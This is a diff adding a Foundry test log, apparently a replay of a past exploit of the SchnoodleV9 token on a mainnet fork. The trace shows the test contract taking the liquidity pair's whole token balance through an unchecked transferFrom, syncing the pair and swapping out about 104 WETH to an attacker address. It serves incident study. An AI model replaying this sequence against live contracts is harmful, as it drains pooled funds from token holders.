@@ -1,0 +1,215 @@
+Compiling 21 files with Solc 0.8.10
+Solc 0.8.10 finished in 836.28ms
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1084:5:
+     |
+1084 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:1896:5:
+     |
+1896 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2198:5:
+     |
+2198 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:2967:5:
+     |
+2967 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> interface.sol:4462:5:
+     |
+4462 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+  --> test/Snood_exp.sol:17:5:
+   |
+17 |     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> interface.sol:805:1:
+    |
+805 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for test/Snood_exp.sol:ContractTest
+[PASS] testExploit() (gas: 300807)
+Logs:
+  before the attack
+  0
+  WETH after the attack
+  104047009087796436864
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 14983660 [1.498e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [329107] ContractTest::testExploit()
+    ├─ emit log(val: "before the attack")
+    ├─ [2534] WETH9::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_uint(val: 0)
+    ├─ [534] WETH9::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    ├─ [14484] TransparentUpgradeableProxy::fallback(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
+    │   ├─ [7153] SchnoodleV9::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   └─ ← [Return] 32308960759206669952686933218 [3.23e28]
+    │   └─ ← [Return] 32308960759206669952686933218 [3.23e28]
+    ├─ [89478] TransparentUpgradeableProxy::fallback(0x0F6b0960d2569f505126341085ED7f0342b67DAe, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32308960759206669952686933217 [3.23e28])
+    │   ├─ [88638] SchnoodleV9::transferFrom(0x0F6b0960d2569f505126341085ED7f0342b67DAe, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 32308960759206669952686933217 [3.23e28]) [delegatecall]
+    │   │   ├─ emit Approval(owner: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, spender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [12331] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
+    │   │   │   ├─ [5000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 32308960759206669952686933217 [3.23e28], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 32308960759206669952686933217 [3.23e28])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit SellQuotaChanged(blockTimestamp: 1655535877 [1.655e9], amount: 1000000000000000000000000000 [1e27])
+    │   │   ├─ emit SellQuotaChanged(blockTimestamp: 1655535877 [1.655e9], amount: 33308960759206669952686933217 [3.33e28])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd1258ba6d7819819a216afe01cb893f383a1f453aba4d737f4d4004ebc2136f2: 0x078e4ee37bdbba3b3e756ca5f693a77c337ddcb4a101f7f3d83c591a4e2e68ae → 0x0000000000000000000000001462fe9812d0537a9a53973e636c63ee254538c6
+    │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0 → 0x078e4ee37bdbba3b3e756ca5e230a8e420ad893a06ae60b574cff52c28e92fe8
+    │   │   │   @ 207: 0x00000000000000000000000000000000000000000590b390d60c7b454d65c631 → 0x00000000000000000000000000000000000000006ba086cceb16a7a1d922c4e1
+    │   │   │   @ 206: 0x0000000000000000000000000000000000000000000000000000000062ac1c61 → 0x0000000000000000000000000000000000000000000000000000000062ad7905
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [32252] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::sync()
+    │   ├─ [2534] WETH9::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
+    │   │   └─ ← [Return] 104047009087796436865 [1.04e20]
+    │   ├─ [1984] TransparentUpgradeableProxy::fallback(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
+    │   │   ├─ [1153] SchnoodleV9::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   └─ ← [Return] 1
+    │   │   └─ ← [Return] 1
+    │   ├─ emit Sync(reserve0: 104047009087796436865 [1.04e20], reserve1: 1)
+    │   ├─  storage changes:
+    │   │   @ 8: 0x62ad56e60000686558904b462764f122c4e2000000000005a3f13b802bf25f81 → 0x62ad79050000000000000000000000000001000000000005a3f13b802bf25f81
+    │   │   @ 9: 0x00000000000000000000001311d2ffba392d04d88c27a7f61428c3f813e0c31b → 0x000000000000000000000013144a8851d24b4a9df649788f33da05db92fd7e12
+    │   │   @ 10: 0x0000000000000000000000000000000000003a60b864090df365e0aad8475167 → 0x0000000000000000000000000000000000003a629055681c173e7b526431fcd3
+    │   └─ ← [Stop]
+    ├─ [112136] TransparentUpgradeableProxy::fallback(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 32308960759206669952686933217 [3.23e28])
+    │   ├─ [111302] SchnoodleV9::transfer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 32308960759206669952686933217 [3.23e28]) [delegatecall]
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [5831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─ [5000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, amount: 32308960759206669952686933217 [3.23e28], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, value: 32308960759206669952686933217 [3.23e28])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ emit SellQuotaChanged(blockTimestamp: 1655535877 [1.655e9], amount: 1000000000000000000000000000 [1e27])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
+    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Burned(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, amount: 1294032628417696682233234600 [1.294e27], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x0000000000000000000000000000000000000000, value: 1294032628417696682233234600 [1.294e27])
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
+    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x6D257D2dB115947dc0C75d285B4396a03C577E2E, amount: 32308960759206669952686933 [3.23e25], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x6D257D2dB115947dc0C75d285B4396a03C577E2E, value: 32308960759206669952686933 [3.23e25])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x6D257D2dB115947dc0C75d285B4396a03C577E2E, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [942] ERC1820Registry::getInterfaceImplementer(0x0F6b0960d2569f505126341085ED7f0342b67DAe, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─ [1831] 0xc5fb34E3f69B18aBfbD17b2bBAbE8c9608D5779a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe)
+    │   │   │   ├─ [1000] 0x8A43aa68442bA8B279793E65fB66aA1D969e4E5a::lockedBalanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   ├─ emit Sent(operator: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x76D8057a98be823DAe57597118f3a02eea9ccFb6, amount: 1292358430368266798107477328 [1.292e27], data: 0x, operatorData: 0x)
+    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x76D8057a98be823DAe57597118f3a02eea9ccFb6, value: 1292358430368266798107477328 [1.292e27])
+    │   │   ├─ [2942] ERC1820Registry::getInterfaceImplementer(0x76D8057a98be823DAe57597118f3a02eea9ccFb6, 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xb3a230513dddb1cdd3720b996ee0c092dd2283d0af5a8e9f3a270304c908de6f: 0x0000012a03b6e25eb444d252ae3ba70b87c638de7c9a98284f1a4d1a21efcd97 → 0x0001efb4d33ead0715ebf6161205259378e8f2a2736bbf345751a8e6867f6577
+    │   │   │   @ 0xd05eebe8f4ee67539321b4acf5174a4ebd82315ac315fac22da94f516c81ac90: 0x00ffdb86c630a42f94e0cb36955b671ad224f2425335608121616ac2ec255b9c → 0x014d213733684e7ed6fe61bec0e09fc50c39523fd80ded90ec3c839d1c94d99c
+    │   │   │   @ 207: 0x00000000000000000000000000000000000000006ba086cceb16a7a1d922c4e1 → 0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000
+    │   │   │   @ 52: 0xe99b260e38daf5a5ccae87ad3070dac1956a24c99c6a6e9148162db91b30009f → 0xe94dc6bd71574a5bbff18354a245f2b8756333c74a3a7f2ddd039ecbd1defecf
+    │   │   │   @ 0xd1258ba6d7819819a216afe01cb893f383a1f453aba4d737f4d4004ebc2136f2: 0x0000000000000000000000001462fe9812d0537a9a53973e636c63ee254538c6 → 0x06f1bb57779899f98df3ae01d91a0840e83fd1f0d32854749a1755866fde50fe
+    │   │   │   @ 0xf85b56951f6ca259eb015e4162809ffc1dd28bc06ffa5a7aa716f2780313bdca: 0x078e4ee37bdbba3b3e756ca5e230a8e420ad893a06ae60b574cff52c28e92fe8 → 0
+    │   │   └─ ← [Return] true
+    │   └─ ← [Return] true
+    ├─ [504] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::getReserves()
+    │   └─ ← [Return] 104047009087796436865 [1.04e20], 1, 1655535877 [1.655e9]
+    ├─ [40587] 0x0F6b0960d2569f505126341085ED7f0342b67DAe::swap(104047009087796436864 [1.04e20], 0, 0x180ea08644b123D8A3f0ECcf2a3b45A582075538, 0x)
+    │   ├─ [25962] WETH9::transfer(0x180ea08644b123D8A3f0ECcf2a3b45A582075538, 104047009087796436864 [1.04e20])
+    │   │   ├─ emit Transfer(from: 0x0F6b0960d2569f505126341085ED7f0342b67DAe, to: 0x180ea08644b123D8A3f0ECcf2a3b45A582075538, value: 104047009087796436864 [1.04e20])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x75835f79105a54ca2b24696267bfd7b85500137738654ddb5e5afc0129de96d9: 0 → 0x000000000000000000000000000000000000000000000005a3f13b802bf25f80
+    │   │   │   @ 0xf58b09b183413c1e44679e93f1cc5266f58d1b75921795b7322cfd4d2677e7c7: 0x000000000000000000000000000000000000000000000005a3f13b802bf25f81 → 1
+    │   │   └─ ← [Return] true
+    │   ├─ [534] WETH9::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
+    │   │   └─ ← [Return] 1
+    │   ├─ [1984] TransparentUpgradeableProxy::fallback(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [staticcall]
+    │   │   ├─ [1153] SchnoodleV9::balanceOf(0x0F6b0960d2569f505126341085ED7f0342b67DAe) [delegatecall]
+    │   │   │   └─ ← [Return] 29732115690897246905537466158 [2.973e28]
+    │   │   └─ ← [Return] 29732115690897246905537466158 [2.973e28]
+    │   ├─ emit Sync(reserve0: 1, reserve1: 29732115690897246905537466158 [2.973e28])
+    │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 0, amount1In: 29732115690897246905537466157 [2.973e28], amount0Out: 104047009087796436864 [1.04e20], amount1Out: 0, to: 0x180ea08644b123D8A3f0ECcf2a3b45A582075538)
+    │   ├─  storage changes:
+    │   │   @ 8: 0x62ad79050000000000000000000000000001000000000005a3f13b802bf25f81 → 0x62ad790500006011d4653ba9a7c959c90f2e0000000000000000000000000001
+    │   └─ ← [Stop]
+    ├─ emit log(val: "WETH after the attack")
+    ├─ [534] WETH9::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
+    │   └─ ← [Return] 104047009087796436864 [1.04e20]
+    ├─ emit log_uint(val: 104047009087796436864 [1.04e20])
+    ├─ [534] WETH9::balanceOf(0x180ea08644b123D8A3f0ECcf2a3b45A582075538) [staticcall]
+    │   └─ ← [Return] 104047009087796436864 [1.04e20]
+    ├─ [0] VM::assertTrue(true) [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.09s (11.45s CPU time)
+
+Ran 1 test suite in 16.12s (13.09s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
